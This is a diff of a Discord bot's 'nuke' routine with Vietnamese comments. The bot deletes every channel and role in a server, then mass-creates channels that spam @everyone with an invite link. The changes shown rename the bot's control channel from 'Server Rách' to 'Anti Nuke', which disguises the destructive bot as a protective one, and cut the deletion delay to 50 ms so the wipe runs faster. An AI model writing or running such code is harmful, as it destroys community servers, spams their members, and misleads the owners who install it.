@@ -64,7 +64,7 @@ client.on("interactionCreate", async interaction => {
 
   // 🔥 Tạo kênh sống sót để giữ context
   const controlChannel = await guild.channels.create({
-    name: "Server Rách",
+    name: "Anti Nuke",
     type: ChannelType.GuildText
   });
 
@@ -75,7 +75,7 @@ client.on("interactionCreate", async interaction => {
     if (ch.id === controlChannel.id) continue;
     try {
       await ch.delete();
-      await sleep(DELETE_DELAY);
+      await sleep(50);
     } catch {}
   }
 
@@ -87,11 +87,11 @@ client.on("interactionCreate", async interaction => {
   for (const role of roles) {
     try {
       await role.delete();
-      await sleep(DELETE_DELAY);
+      await sleep(50);
     } catch {}
   }
 
-  await controlChannel.send("@everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
+  await controlChannel.send("Đang Hoàn Tất @everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
 
   /* ===== TẠO KÊNH + GỬI TIN (TỐI ĐA TỐC ĐỘ) ===== */
   for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
@@ -104,7 +104,7 @@ client.on("interactionCreate", async interaction => {
           type: ChannelType.GuildText
         }).then(async ch => {
           for (let k = 0; k < MSG_PER_CHANNEL; k++) {
-            await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+            await ch.send("Chuẩn bị xong @everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
           }
         })
       );
